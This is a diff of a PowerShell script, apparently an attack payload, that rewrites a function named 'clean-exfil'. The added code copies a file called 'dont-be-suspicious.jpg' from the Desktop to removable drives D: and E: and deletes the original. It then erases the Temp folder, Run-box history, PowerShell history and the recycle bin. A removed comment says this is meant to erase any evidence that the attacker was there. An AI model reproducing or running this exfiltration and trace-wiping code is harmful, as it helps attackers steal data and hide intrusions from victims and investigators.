@@ -292,32 +292,37 @@ rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue
 
 #----------------------------------------------------------------------------------------------------
 
-function clean-exfil {
+ 
+# Change the working directory to the Desktop
+Set-Location -Path "$env:USERPROFILE\Desktop"
 
-<#
+# Copy the file to D:\
+Copy-Item -Path "dont-be-suspicious.jpg" -Destination "D:\" -Force
 
-.NOTES 
-	This is to clean up behind you and remove any evidence to prove you were there
-#>
+# Copy the file to E:\
+Copy-Item -Path "dont-be-suspicious.jpg" -Destination "E:\" -Force
 
-# Delete contents of Temp folder 
+# Delete the file from the Desktop
+Remove-Item -Path "dont-be-suspicious.jpg" -Force
 
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
-# Delete run box history
+# Function to clean up
+function Clean-Exfil {
+    # Delete contents of Temp folder
+    Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
 
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+    # Delete run box history
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name '*' -ErrorAction SilentlyContinue
 
-# Delete powershell history
+    # Delete PowerShell history (PSReadline history)
+    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
 
-Remove-Item (Get-PSreadlineOption).HistorySavePath
-
-# Deletes contents of recycle bin
-
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
+    # Empty the recycle bin
+    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 }
 
-#----------------------------------------------------------------------------------------------------
-clean-exfil
- 
+# Call the cleanup function
+Clean-Exfil
+
+# Exit the script
+exit
